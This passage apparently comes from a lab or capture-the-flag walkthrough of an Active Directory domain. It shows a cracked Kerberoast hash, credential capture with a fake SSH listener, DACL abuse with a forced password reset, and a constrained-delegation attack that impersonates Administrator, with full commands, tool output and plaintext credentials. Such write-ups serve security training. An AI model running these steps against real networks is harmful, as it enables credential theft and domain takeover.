$krb5tgs$23$*ryan.cole$HSM-DEFENSE.LOCAL$hsm-defense.local\ryan.cole*$a7d8558827dc2f355c887f8d0a1373c8$b145eca4144a292180186c221436c8527b9bc611696f22d6985e784ffe14a2d7e788418fe0ef3417b0d581f424f441e0b513c4a5f38d368a44e4fd1b15ca549cc37629a42eda1825ca659ad9bbaa1507629b41e8eb91d5dccfe3dc2f7a163317459319562b718b6f63d3541ae8df112a4d74102f17e05928de155a68bf52cb721549975191ceb34b050ad720fff954ff7fb311f4245ce6a31dd3fb807c0220fe3d150ecf56d230884be9a183876ea2325fcc718b73bfe3401efb98cbd37ecc31957bd3d2b69848bc11dbf8146d41bc0662293de58396cbf861272927376f6f8c78716420bdd8c10888ba694ca03714db2058987516f70c05ca5ecc0e62972752eb7f6e24b03e9f5e83565939e543a0e7679b89ca28df1a7d0f47ef315fcd28516085cd3a6e58daa703fe01587decf82458915b295575ced62c7bf5ed8d0efdb146718ce4e779061638f3c04c66f9106b7d87ea9346e83f2a18b06041435cfaeabc94f03f883afba3bdb33ca1f6a000afff219bcea1ea7e703e54a6d1f7073c227d0a529115fcd260a6d61b7ed8425ba634894c0179b37aa032f8711dcf8bf07ce9d76c16dcf3bf217a293384de9029acd11e38e808b1268f1437cf16f5e12a3d72805feaee0500516ef2515938686b6f11b6d89fdaa57a667c76e90d6c04b9b7c097379a319f4fb1960e1508b38ae7b5c8f119df6f8eabf9ebbc1b34bd02944ae2d7b4f5907cbbb5de4eb7b881732aca7df32b44ee75c440519dcaafa156b9ee62f9652b17edfb0dbe406d33e2f5240f6788a9fe00412bed22898bfb3a28729e00237349e72c9a56170ec063b74b8e7db06209cf1914a2a7c44ad2ee8d053d03ca28ed9355ee037b805d04d76a461f78e682a61f1902c8dcd53a8d1f7a82a93300eecf79ff8982845549eed4aa72ff17b2dc777ffd4c4ea1989833abcc19bdcadc20eba2373632bdb175e60318692cc5822b718d348653e15e776ef6e20b0e48d747337c80e836126bfb158e1dcf7ecd3414dc8a4e53bb9ac0cb463d377f6891db671559f3ce3e4d586132d8b5ab4226cc944e6e683b0fd293e5ab491dd50296eaded034369197cdf5d2db16d1ffbae7a61babec0fb8f8e72de31cfd45bddcdee4bd71246d7c66b6c4cbea554dd7da5975979969b4efab5146744663df0a38cfa3baac98b719d5922ad52e55a9b30408bba861645cfac62a20e8cf3498814dd3cd3b9f564676ff5162c3719ecf1e2a45c8380f1ee03895b910b018efa26c15f089c78c8fc08bdc035e644ddfd3a496776ad3c0e14bde9007ecdabf32db48079b730ef6a706f09a49c8d21f11cf61a3a793bd4fd23ff26e2b7ebcdab8ec6d95a1e479c05ac4fc985d3a1818d3fa31fba75adb1a0b138a2cc495c9d7ab5ceed589a22ecb4b2350d1358a4c267fd3a2bdc49e0c303f1463c2336af43d0c2fa178935838c63f45762333531370d51f95e3aeb4d9a5ed3b32051a75428ce21d3deea50fe82b0426cdf9c823f06e98dd773e80d2110aa9c3df474bf41906ab35082e9c28f3ed67ad1d08295cbe02b2e70302cf4eb78d3f0ab911ba1bec0ce33c9029a42539b26025b8d473a2019ac4da2cff940f4d8cad3f50d65d687fbc174d70c39c:napalmcrack
```

Ill feed this into hashcat and crack the hash

```python
nxc smb dc.hsm-defense.local -u ryan.cole -p 'napalmcrack' -k 
SMB         dc.hsm-defense.local 445    dc               [*]  x64 (name:dc) (domain:hsm-defense.local) (signing:True) (SMBv1:None) (NTLM:False)
SMB         dc.hsm-defense.local 445    dc               [+] hsm-defense.local\ryan.cole:napalmcrack
```

This user is now compromised!

# RDP access as `ryan.cole`

![](Pasted%20image%2020260921194604.png)

I now have access as this user

![](Pasted%20image%2020260921194855.png)

There is an email on the desktop

![](Pasted%20image%2020260921195017.png)

This is the portal that was mentioned earlier

![](Pasted%20image%2020260921195118.png)

This is for the `ITOPS$` machine account

![](Pasted%20image%2020260921195523.png)

Ill start netcat on my host to listen on port 22 then send a connection

```python
nc -lnvp 22                                                  
listening on [any] 22 ...
connect to [10.200.96.178] from (UNKNOWN) [10.1.22.99] 50649
SSH-2.0-paramiko_4.0.0
```

Found the version of SSH that is running

# Capturing credentials for `itops01$`

https://github.com/westenfelder/SSH-Log

![](Pasted%20image%2020260921200512.png)

Ill start the tool

![](Pasted%20image%2020260921200543.png)

Ill send a connection back to myself on port 22 and get the credentials

```python
itops01$:paSSword2459
```

```python
nxc smb dc.hsm-defense.local -u 'itops01$' -p 'paSSword2459' -k                        
SMB         dc.hsm-defense.local 445    dc               [*]  x64 (name:dc) (domain:hsm-defense.local) (signing:True) (SMBv1:None) (NTLM:False)
SMB         dc.hsm-defense.local 445    dc               [+] hsm-defense.local\itops01$:paSSword2459
```

This account is compromised!

# Enumeration as `itops01$`

![](Pasted%20image%2020260921200836.png)

I have WriteDACL on the `svc_delegate` account, this means i can add GenericAll and change the account password

# Compromising `svc_delegate`

```python
dacledit.py -action 'write' -rights 'FullControl' -principal 'itops01$' -target 'svc_delegate' 'hsm-defense.local'/'itops01$':'paSSword2459' -k -dc-host dc.hsm-defense.local
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 

/home/kali/.local/bin/dacledit.py:390: DeprecationWarning: codecs.open() is deprecated. Use open() instead.
  with codecs.open(self.filename, 'w', 'utf-8') as outfile:
[*] DACL backed up to dacledit-20260921-201347.bak
[*] DACL modified successfully!
```

Ill add GenericAll

```python
bloodyAD --host dc.hsm-defense.local -d hsm-defense.local -u 'itops01$' -p 'paSSword2459' -k set password 'svc_delegate' 'Password123!'
[+] Password changed successfully!
```

Then ill change the password of the user

```python
nxc smb dc.hsm-defense.local -u 'svc_delegate' -p 'Password123!' -k                   
SMB         dc.hsm-defense.local 445    dc               [*]  x64 (name:dc) (domain:hsm-defense.local) (signing:True) (SMBv1:None) (NTLM:False)
SMB         dc.hsm-defense.local 445    dc               [+] hsm-defense.local\svc_delegate:Password123!
```

This user is now compromised

# Domain admin via constrained delegation

![](Pasted%20image%2020260921201930.png)

This new user has GenericWrite on the `helpdesk01$` this should mean i can configure constrained delegation

```python
bloodyAD --host dc.hsm-defense.local -d hsm-defense.local -u 'svc_delegate' -p 'Password123!' -k set object 'helpdesk01$' msDS-AllowedToDelegateTo -v 'ldap/DC.hsm-defense.local'       
[+] helpdesk01$'s msDS-AllowedToDelegateTo has been updated
```

First of all ill setup the constrained delegation

```python
bloodyAD --host DC.hsm-defense.local -d hsm-defense.local -u 'svc_delegate' -p 'Password123!' -k add uac 'HELPDESK01$' -f TRUSTED_TO_AUTH_FOR_DELEGATION
[+] ['TRUSTED_TO_AUTH_FOR_DELEGATION'] property flags added to HELPDESK01$'s userAccountControl
```

Then ill add the `TRUSTED_TO_AUTH_FOR_DELEGATION`, this will allow protocol transition making the attack much easier since ill be able to impersonate any user i want

```python
getST.py -spn "ldap/dc.hsm-defense.local" -impersonate "Administrator" "hsm-defense.local"/"helpdesk01$":'Password123' -k
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@ldap_dc.hsm-defense.local@HSM-DEFENSE.LOCAL.ccache
```

Now i can request the ticket for the administrator using the `helpdesk01$` found earlier



